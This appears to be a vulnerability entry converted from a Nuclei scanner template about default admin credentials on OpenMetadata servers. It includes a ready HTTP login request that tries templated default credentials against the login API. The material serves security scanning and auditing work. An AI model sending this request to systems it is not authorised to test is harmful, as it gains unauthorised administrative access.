# Vulnerability: OpenMetadata - Default Login
**Classification:** OPENMETADATA
**Source:** Nuclei Template (`openmetadata-default-login.yaml`)

## Description
OpenMetadata server enables default admin credentials. An attacker can execute unauthorized operations.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /api/v1/users/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"email":"{{username}}","password": "{{base64("{{password}}")}}"}
```

